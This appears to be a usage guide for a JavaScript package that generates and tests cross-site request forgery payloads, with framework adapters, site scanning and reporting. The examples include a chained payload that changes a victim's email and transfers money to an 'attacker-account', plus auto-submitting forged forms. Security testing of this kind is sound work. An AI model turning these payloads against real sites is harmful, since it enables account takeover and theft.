# CSRF-Blaster Usage Guide

This document provides comprehensive instructions on how to use the CSRF-Blaster package for testing CSRF vulnerabilities in web applications.

## Installation

Install CSRF-Blaster using npm:

```bash
npm install csrf-blaster
```

## Getting Started

### Basic Usage

```javascript
const CSRFBlaster = require('csrf-blaster');

// Initialize with default options
const csrfBlaster = new CSRFBlaster();

// Generate a basic CSRF payload
const payload = csrfBlaster.generatePayload({
  url: 'https://example.com/api/update-profile',
  method: 'POST',
  data: {
    name: 'Test User',
    email: 'test@example.com'
  }
});

// Save the payload to an HTML file
const fs = require('fs');
fs.writeFileSync('csrf-payload.html', payload);
```

### Configuration Options

When initializing CSRF-Blaster, you can provide several configuration options:

```javascript
const csrfBlaster = new CSRFBlaster({
  // Time in milliseconds before a request times out
  timeout: 10000,
  
  // Whether to use headless mode for browser automation
  headless: true,
  
  // Enable detailed logging
  verbose: true
});
```

## Core Features

### Generating CSRF Payloads

CSRF-Blaster can generate payloads for various types of requests:

#### Form-Based Payloads

```javascript
const formPayload = csrfBlaster.generatePayload({
  url: 'https://example.com/api/update',
  method: 'POST',
  data: {
    username: 'newusername',
    email: 'new@example.com'
  },
  requestType: 'form'
});
```

#### XHR-Based Payloads

```javascript
const xhrPayload = csrfBlaster.generatePayload({
  url: 'https://example.com/api/update',
  method: 'PUT',
  data: {
    status: 'active'
  },
  requestType: 'xhr',
  contentType: 'application/json'
});
```

#### Fetch-Based Payloads

```javascript
const fetchPayload = csrfBlaster.generatePayload({
  url: 'https://example.com/api/update',
  method: 'DELETE',
  requestType: 'fetch'
});
```

### Testing CSRF Vulnerabilities

CSRF-Blaster can automate the testing process:

```javascript
async function testCSRF() {
  const result = await csrfBlaster.test({
    url: 'https://example.com/api/update-profile',
    method: 'POST',
    data: {
      name: 'Test User',
      email: 'test@example.com'
    }
  });
  
  console.log('Test result:', result);
  
  if (result.success && result.status >= 200 && result.status < 400) {
    console.log('POTENTIAL VULNERABILITY: Request succeeded without CSRF token');
  } else {
    console.log('Application seems to be protected against CSRF');
  }
}

testCSRF();
```

### Creating Standalone Test Files

```javascript
const filePath = csrfBlaster.createStandalone({
  url: 'https://example.com/api/update-profile',
  method: 'POST',
  data: {
    name: 'Test User',
    email: 'test@example.com'
  },
  title: 'Profile Update CSRF Test'
}, './csrf-tests/profile-update.html');

console.log(`Test file created at: ${filePath}`);
```

### Chaining Multiple Requests

CSRF-Blaster can create payloads that execute multiple requests in sequence:

```javascript
const chainPayload = csrfBlaster.generateChain([
  {
    url: 'https://example.com/api/login',
    method: 'POST',
    data: { username: 'test', password: 'password123' },
    chainDelay: 2000 // Wait 2 seconds before the next request
  },
  {
    url: 'https://example.com/api/profile',
    method: 'PUT',
    data: { email: 'hacked@example.com' },
    chainDelay: 1000
  },
  {
    url: 'https://example.com/api/transfer',
    method: 'POST',
    data: { 
      to: 'attacker-account',
      amount: 1000
    }
  }
]);

// Test the chain
async function testChain() {
  const result = await csrfBlaster.requestSender.sendChainRequest(
    chainPayload,
    [
      /* Same array as passed to generateChain */
    ]
  );
  
  console.log('Chain test result:', result);
}
```

## Working with Framework Adapters

CSRF-Blaster provides adapters for popular JavaScript frameworks to improve testing accuracy.

### React Applications

```javascript
const payload = csrfBlaster.generatePayload({
  url: 'https://react-app.example.com/api/update',
  method: 'POST',
  data: { name: 'Test' },
  framework: 'react'
});

// Access the React adapter directly
const { adapters } = require('csrf-blaster');

// Analyze a React application for CSRF vulnerabilities
async function analyzeReactApp() {
  const analysis = await adapters.react.analyzeReactApp('https://react-app.example.com');
  console.log('React analysis:', analysis);
}

// Generate a React component for CSRF testing
const reactComponent = adapters.react.generateTestComponent({
  url: 'https://react-app.example.com/api/update',
  method: 'POST',
  data: { name: 'Test' }
});
```

### Next.js Applications

```javascript
const payload = csrfBlaster.generatePayload({
  url: 'https://nextjs-app.example.com/api/update',
  method: 'POST',
  data: { name: 'Test' },
  framework: 'next'
});

// Access the Next.js adapter
const nextAdapter = require('csrf-blaster').adapters.next;

// Generate a Next.js component for CSRF testing
const nextComponent = nextAdapter.generateTestComponent({
  url: 'https://nextjs-app.example.com/api/update',
  method: 'POST',
  data: { name: 'Test' }
});
```

### Vue.js Applications

```javascript
const payload = csrfBlaster.generatePayload({
  url: 'https://vue-app.example.com/api/update',
  method: 'POST',
  data: { name: 'Test' },
  framework: 'vue'
});

// Generate a Vue component for CSRF testing
const vueComponent = require('csrf-blaster').adapters.vue.generateTestComponent({
  url: 'https://vue-app.example.com/api/update',
  method: 'POST',
  data: { name: 'Test' }
});
```

### Nuxt.js Applications

```javascript
const payload = csrfBlaster.generatePayload({
  url: 'https://nuxt-app.example.com/api/update',
  method: 'POST',
  data: { name: 'Test' },
  framework: 'nuxt'
});

// Generate a Nuxt component for CSRF testing
const nuxtComponent = require('csrf-blaster').adapters.nuxt.generateTestComponent({
  url: 'https://nuxt-app.example.com/api/update',
  method: 'POST',
  data: { name: 'Test' }
});
```

### Express.js Applications

```javascript
const payload = csrfBlaster.generatePayload({
  url: 'https://express-app.example.com/api/update',
  method: 'POST',
  data: { name: 'Test' },
  framework: 'express'
});

// Generate an Express script for CSRF testing
const expressScript = require('csrf-blaster').adapters.express.generateTestScript({
  url: 'https://express-app.example.com/api/update',
  method: 'POST',
  data: { name: 'Test' }
});
```

## Advanced Usage

### Working with CSRF Tokens

CSRF-Blaster can handle various CSRF token scenarios:

#### Manually Specifying CSRF Tokens

```javascript
const payload = csrfBlaster.generatePayload({
  url: 'https://example.com/api/update',
  method: 'POST',
  data: { name: 'Test' },
  csrfToken: {
    // For form requests: token is included as a form field
    fieldName: 'csrf_token',
    value: 'a1b2c3d4e5f6',
    
    // For XHR/fetch requests: token is included in headers
    headerName: 'X-CSRF-Token'
  }
});
```

#### Automatic CSRF Token Extraction

Framework adapters attempt to extract CSRF tokens automatically:

```javascript
const payload = csrfBlaster.generatePayload({
  url: 'https://example.com/api/update',
  method: 'POST',
  data: { name: 'Test' },
  framework: 'react' // The adapter will include extraction code
});
```

### Analyzing Websites for CSRF Vulnerabilities

CSRF-Blaster can scan a website to identify potential CSRF targets:

```javascript
async function scanWebsite() {
  const generator = new CSRFBlaster.CSRFGenerator();
  
  try {
    // Analyze the website
    const targets = await generator.analyzeWebsite('https://example.com');
    
    console.log(`Found ${targets.length} potential CSRF targets:`);
    
    // Generate and test payloads for each target
    for (const target of targets) {
      console.log(`\nTarget: ${target.action} (${target.method})`);
      console.log(`Fields: ${target.fields.map(f => f.name).join(', ')}`);
      
      // Has CSRF protection?
      if (target.csrfToken) {
        console.log(`CSRF token detected: ${target.csrfToken.fieldName}`);
      } else {
        console.log('No CSRF token detected');
        
        // Generate a test payload
        const payload = csrfBlaster.generatePayload({
          url: target.action,
          method: target.method,
          data: target.fields.reduce((obj, field) => {
            obj[field.name] = field.value;
            return obj;
          }, {})
        });
        
        // Save the payload
        const filename = `csrf-test-${target.action.replace(/[^a-z0-9]/gi, '_')}.html`;
        fs.writeFileSync(filename, payload);
        console.log(`Test payload saved to ${filename}`);
      }
    }
  } catch (error) {
    console.error('Error scanning website:', error);
  }
}

scanWebsite();
```

### Custom Templates

CSRF-Blaster allows customization of payload templates:

```javascript
const customPayload = csrfBlaster.payloadBuilder.build({
  url: 'https://example.com/api/update',
  method: 'POST',
  data: { name: 'Test' },
  template: `
<form id="csrf-form-custom" action="https://example.com/api/update" method="POST">
  <input type="hidden" name="name" value="Test">
  <input type="hidden" name="custom" value="value">
  <button type="submit">Submit</button>
</form>`,
  title: 'Custom CSRF Test',
  autoSubmit: true
});
```

## Best Practices

1. **Always get proper authorization** before testing for CSRF vulnerabilities
2. **Document your testing activities** for compliance and transparency
3. **Use descriptive titles** for your test payloads
4. **Enable verbose mode** during testing to get detailed information
5. **Analyze the application first** to understand its authentication and CSRF protection mechanisms
6. **Test with both authenticated and non-authenticated sessions**
7. **Check different request types** (GET, POST, PUT, DELETE)
8. **Verify suspected vulnerabilities manually** before reporting them

## Troubleshooting

### Common Issues

#### Payload Generation Fails

```javascript
try {
  const payload = csrfBlaster.generatePayload({
    // Parameters
  });
} catch (error) {
  console.error('Payload generation failed:', error.message);
}
```

#### Request Timeouts

Increase the timeout value if requests are timing out:

```javascript
const csrfBlaster = new CSRFBlaster({
  timeout: 30000 // 30 seconds
});
```

#### Browser Automation Issues

If you encounter issues with headless browser automation:

```javascript
const csrfBlaster = new CSRFBlaster({
  headless: false, // This will show the browser window
  timeout: 30000
});
```

## Example Workflow

Here's a complete example workflow for testing CSRF vulnerabilities:

```javascript
const CSRFBlaster = require('csrf-blaster');
const fs = require('fs');
const path = require('path');

async function testWebsiteForCSRF(url) {
  console.log(`Testing ${url} for CSRF vulnerabilities...`);
  
  // Initialize CSRF-Blaster
  const csrfBlaster = new CSRFBlaster({
    verbose: true,
    timeout: 15000
  });
  
  try {
    // Step 1: Analyze the website
    console.log('\nStep 1: Analyzing website...');
    const generator = new CSRFBlaster.CSRFGenerator();
    const targets = await generator.analyzeWebsite(url);
    
    console.log(`Found ${targets.length} potential targets`);
    
    // Create output directory
    const outputDir = path.join(__dirname, 'csrf-tests');
    if (!fs.existsSync(outputDir)) {
      fs.mkdirSync(outputDir);
    }
    
    // Step 2: Generate and test payloads
    console.log('\nStep 2: Testing targets...');
    
    const results = [];
    
    for (let i = 0; i < targets.length; i++) {
      const target = targets[i];
      console.log(`\nTesting target ${i+1}/${targets.length}: ${target.action}`);
      
      // Create test data from form fields
      const testData = target.fields.reduce((obj, field) => {
        obj[field.name] = field.value || 'test_value';
        return obj;
      }, {});
      
      // Generate payload
      console.log('Generating payload...');
      const payload = csrfBlaster.generatePayload({
        url: target.action,
        method: target.method,
        data: testData
      });
      
      // Save payload to file
      const filename = `target_${i+1}_${target.method}.html`;
      const filePath = path.join(outputDir, filename);
      fs.writeFileSync(filePath, payload);
      console.log(`Payload saved to ${filePath}`);
      
      // Test if vulnerable
      console.log('Testing vulnerability...');
      const result = await csrfBlaster.test({
        url: target.action,
        method: target.method,
        data: testData
      });
      
      // Record result
      results.push({
        target: target.action,
        method: target.method,
        hasCSRFToken: !!target.csrfToken,
        statusCode: result.status,
        potentiallyVulnerable: result.success && result.status >= 200 && result.status < 400
      });
      
      console.log(`Result: ${result.success ? 'Request succeeded' : 'Request failed'}`);
      console.log(`Status: ${result.status}`);
    }
    
    // Step 3: Generate report
    console.log('\nStep 3: Generating report...');
    
    const vulnerableTargets = results.filter(r => r.potentiallyVulnerable);
    
    const report = `
# CSRF Vulnerability Scan Report

Target: ${url}
Date: ${new Date().toISOString()}

## Summary

- Targets scanned: ${results.length}
- Potentially vulnerable targets: ${vulnerableTargets.length}

## Detailed Results

${results.map((r, i) => `
### Target ${i+1}: ${r.target}

- Method: ${r.method}
- Has CSRF Token: ${r.hasCSRFToken ? 'Yes' : 'No'}
- Status Code: ${r.statusCode}
- Potentially Vulnerable: ${r.potentiallyVulnerable ? 'YES' : 'No'}
`).join('\n')}

## Recommendations

${vulnerableTargets.length > 0 ? 
`The following endpoints should be reviewed for proper CSRF protection:
${vulnerableTargets.map(v => `- ${v.target} (${v.method})`).join('\n')}` : 
'No potentially vulnerable endpoints were identified.'}
`;
    
    const reportPath = path.join(outputDir, 'csrf_report.md');
    fs.writeFileSync(reportPath, report);
    console.log(`Report saved to ${reportPath}`);
    
    return {
      targets: targets.length,
      vulnerableTargets: vulnerableTargets.length,
      reportPath
    };
  } catch (error) {
    console.error('Error testing for CSRF vulnerabilities:', error);
    throw error;
  }
}

// Example usage
testWebsiteForCSRF('https://example.com')
  .then(result => {
    console.log('\nScan completed!');
    console.log(`Scanned ${result.targets} targets`);
    console.log(`Found ${result.vulnerableTargets} potentially vulnerable targets`);
    console.log(`See full report at: ${result.reportPath}`);
  })
  .catch(err => {
    console.error('Scan failed:', err);
  });
```

## Conclusion

CSRF-Blaster provides a comprehensive toolkit for testing CSRF vulnerabilities in web applications. By following this guide, you can effectively identify and test for CSRF vulnerabilities, helping to improve the security of your applications.

Remember that all security testing should be performed ethically and with proper authorization. CSRF-Blaster is a tool for security professionals and should only be used for legitimate security testing purposes.